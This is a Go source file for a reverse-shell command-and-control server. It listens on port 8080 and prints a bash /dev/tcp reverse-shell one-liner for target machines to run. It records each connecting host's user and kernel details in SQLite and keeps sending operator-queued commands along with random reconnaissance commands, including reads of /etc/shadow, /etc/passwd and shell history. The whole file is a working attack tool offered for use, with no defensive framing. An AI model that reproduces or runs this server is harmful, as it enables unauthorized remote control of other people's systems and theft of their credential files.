package main

import (
	"database/sql"
	"fmt"
	"log"
	"net"
	"os"
	"strings"
	"time"

	_ "github.com/mattn/go-sqlite3"
)

var (
	dbPath      = "./commands.db"
	commandList = []string{
		"ls -la",
		"pwd",
		"whoami",
		"date",
		"uptime",
		"hostname",
		"df -h",
		"free -m",
		"ifconfig",
		"netstat -tuln",
		"iptables -L",
		"ps aux",
		"top -b -n1",
		"cat /etc/os-release",
		"uname -a",
		"curl ifconfig.me",
		"traceroute google.com",
		"ping -c 4 8.8.8.8",
		"cat /etc/passwd",
		"cat /etc/shadow",
		"history",
		"who",
		"last",
		"service --status-all",
		"systemctl list-units --type=service",
	}
)

func initDB() {
	if _, err := os.Stat(dbPath); os.IsNotExist(err) {
		db, err := sql.Open("sqlite3", dbPath)
		if err != nil {
			log.Fatalf("Failed to create DB: %v", err)
		}
		defer db.Close()

		_, err = db.Exec(`CREATE TABLE IF NOT EXISTS priority_commands (
			id INTEGER PRIMARY KEY AUTOINCREMENT,
			command TEXT NOT NULL
		);`)
		if err != nil {
			log.Fatalf("Failed to create table: %v", err)
		}

		_, err = db.Exec(`CREATE TABLE IF NOT EXISTS connections (
			ip TEXT NOT NULL,
			port TEXT NOT NULL,
			connected_at DATETIME DEFAULT CURRENT_TIMESTAMP,
			uname TEXT,
			user TEXT,
			PRIMARY KEY (ip, port)
		);`)
	}
}

func getPriorityCommands(db *sql.DB) ([]string, error) {
	rows, err := db.Query("SELECT command FROM priority_commands")
	if err != nil {
		return nil, err
	}
	defer rows.Close()

	var cmds []string
	for rows.Next() {
		var cmd string
		if err := rows.Scan(&cmd); err != nil {
			return nil, err
		}
		cmds = append(cmds, cmd)
	}
	return cmds, nil
}

func handleConnection(conn net.Conn, db *sql.DB) {
	defer conn.Close()
	fmt.Printf("Accepted connection from %s\n", conn.RemoteAddr())
	// Log connection
	ip, port, _ := net.SplitHostPort(conn.RemoteAddr().String())
	_, err := db.Exec("INSERT OR REPLACE INTO connections (ip, port) VALUES (?, ?)", ip, port)
	if err != nil {
		log.Printf("Failed to log connection: %v", err)
	}

	// Send two initial commands
	initialCommands := []string{"whoami", "uname -a"}
	for _, cmd := range initialCommands {
		cmdName := strings.SplitN(cmd, " ", 2)[0]
		_, err := conn.Write([]byte( cmd + " | awk '{print \"[PRIORITY_" + cmdName + "] \"$0}'\n"))
		if err != nil {
			log.Printf("Error writing to connection %s: %v\n", conn.RemoteAddr(), err)
			return
		}
		
		time.Sleep(1 * time.Second)
	}

	go func() {
		for {
			// Priority commands first
			priorityCommands, err := getPriorityCommands(db)
			if err == nil && len(priorityCommands) > 0 {
				for _, command := range priorityCommands {
					_, err := conn.Write([]byte(command + " | awk '{print \"[PRIORITY:1] \"$0}'\n"))
					fmt.Printf("Sent PRIORITY to %s: %s\n", conn.RemoteAddr(), command)
					// append the command to the priority log file
					f, err := os.OpenFile("priority1.log", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
					if err == nil {
						_, _ = f.WriteString("[COMMAND]" + command + "\n")
						f.Close()
					} else {
						log.Printf("Error writing to priority commands file: %v\n", err)
					}
					if err != nil {
						log.Printf("Error writing to connection %s: %v\n", conn.RemoteAddr(), err)
						return
					}
					// Remove the command after sending
					_, err = db.Exec("DELETE FROM priority_commands WHERE command = ?", command)
					if err != nil {
						log.Printf("Failed to remove priority command: %v", err)
					}
					time.Sleep(2 * time.Second)
				}
			}

			// Then random command
			time.Sleep(5 * time.Second)
			idx := time.Now().UnixNano() % int64(len(commandList))
			command := commandList[idx]
			_, err = conn.Write([]byte(command + " | awk '{print \"[PRIORITY:0] \"$0}'\n"))
			fmt.Printf("Sent to %s: %s\n", conn.RemoteAddr(), command)
			if err != nil {
				log.Printf("Error writing to connection %s: %v\n", conn.RemoteAddr(), err)
				return
			}
		}
	}()

	buf := make([]byte, 1024)
	for {
		n, err := conn.Read(buf)
		if err != nil {
			log.Printf("Error reading from connection %s: %v\n", conn.RemoteAddr(), err)
			return
		}
		data := string(buf[:n])
		lines := strings.Split(data, "\n")
		for _, line := range lines {
			if strings.HasPrefix(line, "[PRIORITY:1]") {
				fmt.Printf("Received PRIORITY:1 from %s: %s\n", conn.RemoteAddr(), strings.TrimPrefix(line, "[PRIORITY:1] "))
				// Append to file
				f, err := os.OpenFile("priority1.log", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
				if err == nil {
					_, _ = f.WriteString(strings.TrimPrefix(line, "[PRIORITY:1] ") + "\n")
					f.Close()
				} else {
					log.Printf("Error writing to file: %v\n", err)
				}
			}
			if strings.HasPrefix(line, "[PRIORITY_") {
				fmt.Printf("Received PRIORITY_INIT from %s: %s\n", conn.RemoteAddr(), strings.TrimPrefix(line, "[PRIORITY_] "))
				// Parse the _ after PRIORITY_ to get the command name if its uname add it to the uname field in the db
				// if its whoami add it to the user field in the db
				parts := strings.SplitN(line, " ", 2)
				log.Printf("Debug parts: %v", parts)
				if len(parts) == 2 {
					cmdName := strings.TrimSuffix(strings.TrimPrefix(parts[0], "[PRIORITY_"), "]")
					// Find the text up to the first space and use that to remove the prefix of [PRIORITY_<command>] to get the output
					cmdOutput := strings.TrimPrefix(line, "[PRIORITY_"+cmdName+"] ")
					log.Printf("Debug cmdName: %s, cmdOutput: %s", cmdName, cmdOutput)
					log.Printf("Received %s output from %s: %s\n", cmdName, conn.RemoteAddr(), line)
					// Update the db based on the command
					var field string
					switch cmdName {
					case "uname":
						field = "uname"
					case "whoami":
						field = "user"
					default:
						field = ""
					}
					if field != "" {
						log.Printf("Updating %s for %s:%s\n", field, ip, port)
						_, err := db.Exec(fmt.Sprintf("UPDATE connections SET %s = ? WHERE ip = ? AND port = ?", field), cmdOutput, ip, port)
						if err != nil {
							log.Printf("Failed to update connection info: %v", err)
						}
					}
				}
			}
		}
	}
}

func main() {
	initDB()
	db, err := sql.Open("sqlite3", dbPath)
	if err != nil {
		log.Fatalf("Error opening DB: %v", err)
	}
	defer db.Close()

	if len(os.Args) > 2 && os.Args[1] == "priority-add" {
		cmd := strings.Join(os.Args[2:], " ")
		_, err := db.Exec("INSERT INTO priority_commands (command) VALUES (?)", cmd)
		if err != nil {
			log.Fatalf("Failed to add priority command: %v", err)
		}
		fmt.Printf("Added priority command: %s\n", cmd)
		return
	}

	if len(os.Args) > 2 && os.Args[1] == "priority-remove" {
		cmd := strings.Join(os.Args[2:], " ")
		_, err := db.Exec("DELETE FROM priority_commands WHERE command = ?", cmd)
		if err != nil {
			log.Fatalf("Failed to remove priority command: %v", err)
		}
		fmt.Printf("Removed priority command: %s\n", cmd)
		return
	}

	if len(os.Args) > 1 && os.Args[1] == "list-connections" {
		rows, err := db.Query("SELECT ip, port, connected_at, uname, user FROM connections")
		if err != nil {
			log.Fatalf("Failed to query connections: %v", err)
		}
		defer rows.Close()
		fmt.Println("Active Connections:")
		for rows.Next() {
			var ip, port, connectedAt, uname, user string
			if err := rows.Scan(&ip, &port, &connectedAt, &uname, &user); err != nil {
				log.Fatalf("Failed to scan connection: %v", err)
			}
			fmt.Printf("IP: %s, Port: %s, Connected At: %s, Uname: %s, User: %s\n", ip, port, connectedAt, uname, user)
		}
		return
	}

	port := ":8080"
	listener, err := net.Listen("tcp", port)
	if err != nil {
		log.Fatalf("Error listening on port %s: %v", port, err)
	}
	defer listener.Close()

	fmt.Printf("Listening for connections on %s\n", port)
	fmt.Printf("To connect, use: /bin/bash -i >& /dev/tcp/<ip>/%s 0>&1\n", strings.Split(port, ":")[1])

	for {
		conn, err := listener.Accept()
		if err != nil {
			log.Printf("Error accepting connection: %v\n", err)
			continue
		}
		go handleConnection(conn, db)
	}
}
